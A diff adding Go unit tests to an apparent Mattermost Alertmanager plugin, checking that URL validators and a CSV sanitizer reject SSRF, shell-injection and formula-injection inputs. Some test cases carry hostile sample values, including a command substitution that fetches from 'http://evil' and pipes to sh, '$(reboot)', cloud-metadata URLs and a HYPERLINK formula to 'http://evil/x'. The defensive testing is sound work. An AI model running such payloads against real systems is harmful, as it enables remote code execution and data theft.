@@ -1,9 +1,55 @@
 package main
 
 import (
+	"encoding/json"
+	"fmt"
+	"net/http"
+	"os"
 	"strings"
 	"testing"
 )
+
+// TestRawConfigMapCoversSchema is the drift guard for rawConfiguration.toConfigMap:
+// it must render EXACTLY the settings_schema keys from plugin.json (lowercased).
+// A mismatch means a setting was added/removed without updating toConfigMap —
+// which would make /alertmanager metrics-token generate silently drop or invent a
+// setting when it rewrites the whole plugin-config map.
+func TestRawConfigMapCoversSchema(t *testing.T) {
+	blob, err := os.ReadFile("../plugin.json")
+	if err != nil {
+		t.Fatalf("read plugin.json: %v", err)
+	}
+	var manifest struct {
+		SettingsSchema struct {
+			Settings []struct {
+				Key string `json:"key"`
+			} `json:"settings"`
+		} `json:"settings_schema"`
+	}
+	if err := json.Unmarshal(blob, &manifest); err != nil {
+		t.Fatalf("parse plugin.json: %v", err)
+	}
+
+	schemaKeys := make(map[string]bool)
+	for _, s := range manifest.SettingsSchema.Settings {
+		schemaKeys[strings.ToLower(s.Key)] = true
+	}
+	mapKeys := make(map[string]bool)
+	for k := range (rawConfiguration{}).toConfigMap() {
+		mapKeys[k] = true
+	}
+
+	for k := range schemaKeys {
+		if !mapKeys[k] {
+			t.Errorf("settings_schema key %q is missing from rawConfiguration.toConfigMap — add it, or metrics-token generate will wipe it", k)
+		}
+	}
+	for k := range mapKeys {
+		if !schemaKeys[k] {
+			t.Errorf("toConfigMap writes %q which is not a settings_schema key — remove it", k)
+		}
+	}
+}
 
 // TestValidateWebhookHost guards the only sysadmin-typed setting in the
 // plugin's System Console form. Garbage here propagates straight into
@@ -27,8 +73,14 @@ func TestValidateWebhookHost(t *testing.T) {
 		{"empty host is rejected", "https://", true, "host"},
 		{"path is rejected", "https://mattermost.example.com/plugins", true, "path"},
 		{"trailing slash alone is allowed", "https://mattermost.example.com/", false, ""},
-		{"query string is rejected", "https://mattermost.example.com?foo=bar", true, "query"},
-		{"fragment is rejected", "https://mattermost.example.com#section", true, "query"},
+		{"query string is rejected", "https://mattermost.example.com?foo=bar", true, "'?'"},
+		{"fragment is rejected", "https://mattermost.example.com#section", true, "'?'"},
+		// Hardened to the validateAlertManagerURL bar — a second attacker-controllable
+		// URL (per-receiver --webhook-host) that drives a webhook-test POST and lands
+		// in generated api_url YAML, so it must reject the same SSRF/injection shapes.
+		{"embedded credentials rejected", "http://user:pass@mattermost.example.com", true, "credential"},
+		{"single quote in host rejected (YAML injection)", "http://mattermost.example.com'", true, "invalid characters"},
+		{"literal cloud-metadata IP rejected", "http://169.254.169.254", true, "blocked destination"},
 	}
 
 	for _, tc := range cases {
@@ -44,6 +96,204 @@ func TestValidateWebhookHost(t *testing.T) {
 				t.Fatalf("error %q does not contain expected fragment %q", err.Error(), tc.errFrag)
 			}
 		})
+	}
+}
+
+// TestValidateAlertManagerURL is the CL-03/CL-21 guard: the AM URL renders into
+// a copy-paste `curl` shell fence and a CSV a sysadmin opens, so the validator
+// must reject shell/CSV injection and SSRF-shaped values while accepting the
+// legitimate host[:port][/path] forms.
+func TestValidateAlertManagerURL(t *testing.T) {
+	cases := []struct {
+		name    string
+		input   string
+		wantErr bool
+	}{
+		{"empty is valid (URL is optional)", "", false},
+		{"plain host:port", "http://alertmanager:9093", false},
+		{"https host", "https://am.example.com", false},
+		{"reverse-proxy path prefix", "https://obs.example.com/alertmanager", false},
+		{"IPv6 literal (non-blocked)", "http://[2001:db8::1]:9093", false},
+		{"trailing slash only", "http://am:9093/", false},
+		// SSRF always-blocked literal IPs (F-001) rejected at save time.
+		{"IPv6 loopback rejected", "http://[::1]:9093", true},
+		{"IPv4 loopback rejected", "http://127.0.0.1:8065", true},
+		{"cloud metadata (link-local) rejected", "http://169.254.169.254", true},
+		{"unspecified address rejected", "http://0.0.0.0:9093", true},
+		{"private RFC1918 rejected by default (no allowlist)", "http://10.0.0.5:9093", true},
+		{"ftp scheme rejected", "ftp://am:9093", true},
+		{"embedded credentials rejected", "http://user:pass@am:9093", true},
+		{"query string rejected", "http://am:9093?x=y", true},
+		{"fragment rejected", "http://am:9093#frag", true},
+		// Trailing BARE markers: url.Parse reports empty RawQuery/Fragment for
+		// these, so the old parsed-component check missed them. The string scan
+		// catches them (F-002, PR #58). amURL+"/api/v2/alerts" would otherwise
+		// truncate onto the wrong endpoint.
+		{"trailing bare fragment rejected", "http://am:9093/#", true},
+		{"trailing bare query rejected", "http://am:9093/?", true},
+		{"metadata SSRF with trailing fragment rejected", "http://169.254.169.254/latest/meta-data/#", true},
+		{"non-numeric port rejected", "http://am:xyz", true},
+		// The headline injection: survives strings.Fields via ${IFS}, would land
+		// unquoted in `curl -X POST <url>/-/reload`.
+		{"shell command substitution rejected", "http://am:9093$(curl${IFS}-s${IFS}http://evil|sh)", true},
+		{"backtick in host rejected", "http://am`whoami`:9093", true},
+		{"shell-danger path rejected", "http://am:9093/$(reboot)", true},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			err := validateAlertManagerURL(tc.input)
+			if tc.wantErr && err == nil {
+				t.Fatalf("expected error for %q, got nil", tc.input)
+			}
+			if !tc.wantErr && err != nil {
+				t.Fatalf("expected no error for %q, got %v", tc.input, err)
+			}
+		})
+	}
+}
+
+// TestAlertManagerURLCannotTruncateAppendedPath asserts the property that
+// actually matters, rather than trusting the field checks: for any base URL
+// validateAlertManagerURL accepts, appending the plugin's API path must still
+// produce a request to that path. A trailing '#'/'?' silently breaks this and is
+// invisible to a parsed-component check (F-002, PR #58).
+func TestAlertManagerURLCannotTruncateAppendedPath(t *testing.T) {
+	accepted := []string{
+		"http://alertmanager:9093",
+		"https://am.example.com",
+		"https://mon.example.com/alertmanager",
+	}
+	for _, base := range accepted {
+		t.Run("accepted/"+base, func(t *testing.T) {
+			if err := validateAlertManagerURL(base); err != nil {
+				t.Fatalf("precondition: %q should be accepted, got %v", base, err)
+			}
+			req, err := http.NewRequest(http.MethodGet, base+"/api/v2/alerts", nil)
+			if err != nil {
+				t.Fatalf("building request for %q: %v", base, err)
+			}
+			if !strings.HasSuffix(req.URL.Path, "/api/v2/alerts") {
+				t.Fatalf("appended path was truncated: base=%q wire path=%q", base, req.URL.Path)
+			}
+		})
+	}
+	truncating := []string{
+		"http://evil.internal/x#",
+		"http://evil.internal/x?",
+		"http://169.254.169.254/latest/meta-data/#",
+	}
+	for _, base := range truncating {
+		t.Run("rejected/"+base, func(t *testing.T) {
+			if err := validateAlertManagerURL(base); err == nil {
+				t.Fatalf("%q must be rejected: appending /api/v2/alerts sends the request somewhere else", base)
+			}
+		})
+	}
+}
+
+// TestSanitizeAlertManagerURL covers the load-path backstop for F-002: stored
+// values are neutered (never rejected) so a bad one can't brick the plugin.
+func TestSanitizeAlertManagerURL(t *testing.T) {
+	cases := []struct {
+		name  string
+		input string
+		want  string
+	}{
+		{"clean URL is unchanged", "http://alertmanager:9093", "http://alertmanager:9093"},
+		{"path prefix is preserved", "https://mon.example.com/alertmanager", "https://mon.example.com/alertmanager"},
+		{"trailing bare fragment is stripped", "http://169.254.169.254/latest/#", "http://169.254.169.254/latest/"},
+		{"fragment is stripped", "http://am.example.com/x#frag", "http://am.example.com/x"},
+		{"query is stripped", "http://am.example.com/x?a=b", "http://am.example.com/x"},
+		{"embedded credentials are stripped", "http://user:pass@am.example.com", "http://am.example.com"},
+		{"whitespace-only input becomes empty", "   \t\n  ", ""},
+		{"whitespace-padded valid URL is trimmed", " http://alertmanager:9093 ", "http://alertmanager:9093"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := sanitizeAlertManagerURL(tc.input); got != tc.want {
+				t.Fatalf("sanitizeAlertManagerURL(%q) = %q, want %q", tc.input, got, tc.want)
+			}
+		})
+	}
+}
+
+// TestParseAlertConfigsNeutersHostileURL asserts the two properties that matter
+// together: a config carrying a hostile Alertmanager URL must still LOAD (a hard
+// failure here returns from OnConfigurationChange and takes the whole plugin
+// down, turning F-002 into a persistent DoS), and the stored URL comes back
+// neutered (F-002, PR #58).
+func TestParseAlertConfigsNeutersHostileURL(t *testing.T) {
+	blob := `[{"name":"probe--alpha-ops","team":"alpha","channel":"ops",` +
+		`"alertManagerURL":"http://169.254.169.254/latest/meta-data/#","webhookID":"hook1"}]`
+	entries, err := parseAlertConfigs(blob)
+	if err != nil {
+		t.Fatalf("a config with a hostile URL must still load, got error: %v", err)
+	}
+	if len(entries) != 1 {
+		t.Fatalf("expected 1 entry, got %d", len(entries))
+	}
+	got := entries[0].AlertManagerURL
+	if strings.ContainsAny(got, "?#") {
+		t.Fatalf("stored URL was not sanitized: %q", got)
+	}
+	if err := validateAlertManagerURL(got); err != nil {
+		t.Fatalf("sanitized URL should pass validation, got %v", err)
+	}
+}
+
+// TestParseAlertConfigsBlanksUnfixableStoredURL: sanitize strips every
+// exploitable input, so by the time validateAlertManagerURL runs on the load
+// path the only failing values left are ones sanitize can't repair (no scheme /
+// no host). Those are inert (http.Client.Do fails on them, no SSRF value), so the
+// load path blanks them rather than hard-failing parseAlertConfigs and bricking
+// the plugin over a benign stored typo (F-002, PR #58).
+func TestParseAlertConfigsBlanksUnfixableStoredURL(t *testing.T) {
+	cases := []struct {
+		name  string
+		input string
+	}{
+		{"scheme-less host:port is blanked", "alertmanager:9093"},
+		{"scheme-less dotted host:port is blanked", "am.example.com:9093"},
+		{"scheme with no host is blanked", "ftp://x"},
+		{"whitespace-only is blanked", "   "},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			blob := fmt.Sprintf(`[{"name":"probe--alpha-ops","team":"alpha","channel":"ops","alertManagerURL":%q,"webhookID":"hook1"}]`, tc.input)
+			entries, err := parseAlertConfigs(blob)
+			if err != nil {
+				t.Fatalf("an unfixable-but-inert alertManagerURL must still load, got error: %v", err)
+			}
+			if len(entries) != 1 {
+				t.Fatalf("expected 1 entry, got %d", len(entries))
+			}
+			if entries[0].AlertManagerURL != "" {
+				t.Fatalf("expected unfixable stored URL %q to be blanked, got %q", tc.input, entries[0].AlertManagerURL)
+			}
+		})
+	}
+}
+
+// TestCSVSafe pins the CL-21 formula-injection neutralization: formula-leading
+// cells get a quote prefix, benign cells are untouched.
+func TestCSVSafe(t *testing.T) {
+	cases := []struct {
+		in   string
+		want string
+	}{
+		{"", ""},
+		{"http://am:9093", "http://am:9093"},
+		{"high-cpu-usage--team-chan", "high-cpu-usage--team-chan"},
+		{`=HYPERLINK("http://evil/x","OK")`, `'=HYPERLINK("http://evil/x","OK")`},
+		{"+WEBSERVICE(A1)", "'+WEBSERVICE(A1)"},
+		{"-2+3", "'-2+3"},
+		{"@SUM(A1)", "'@SUM(A1)"},
+		{"\ttabbed", "'\ttabbed"},
+	}
+	for _, tc := range cases {
+		if got := csvSafe(tc.in); got != tc.want {
+			t.Errorf("csvSafe(%q) = %q, want %q", tc.in, got, tc.want)
+		}
 	}
 }
 
@@ -233,16 +483,23 @@ func TestParseAlertConfigs(t *testing.T) {
 	t.Run("shared webhookID across mismatched groups is rejected", func(t *testing.T) {
 		// Catches the bad-state cases: hand-edit error or plugin bug
 		// where one webhookID gets claimed by two different groups.
+		// Realistic 32-hex webhook ID so the redaction assertion has teeth (a
+		// 2-char token trivially wouldn't reappear in a sha256 fingerprint).
+		const sharedHook = "abcdef0123456789abcdef0123456789"
 		blob := `[
-			{"name":"x--alerts","team":"ops","channel":"alerts","webhookID":"w1","groupName":"compute"},
-			{"name":"y--alerts","team":"ops","channel":"alerts","webhookID":"w1","groupName":"database"}
+			{"name":"x--alerts","team":"ops","channel":"alerts","webhookID":"` + sharedHook + `","groupName":"compute"},
+			{"name":"y--alerts","team":"ops","channel":"alerts","webhookID":"` + sharedHook + `","groupName":"database"}
 		]`
 		_, err := parseAlertConfigs(blob)
 		if err == nil {
 			t.Fatal("expected error for mismatched groups sharing webhookID")
 		}
-		if !strings.Contains(err.Error(), "webhookID") {
-			t.Fatalf("expected webhookID error, got %q", err.Error())
+		if !strings.Contains(err.Error(), "sharing requires matching team+channel+group") {
+			t.Fatalf("expected a webhook-sharing conflict error, got %q", err.Error())
+		}
+		// The raw webhook ID (a bearer token) must not leak into the error (CL-13).
+		if strings.Contains(err.Error(), sharedHook) {
+			t.Fatalf("error leaked the raw webhook ID: %q", err.Error())
 		}
 	})
 
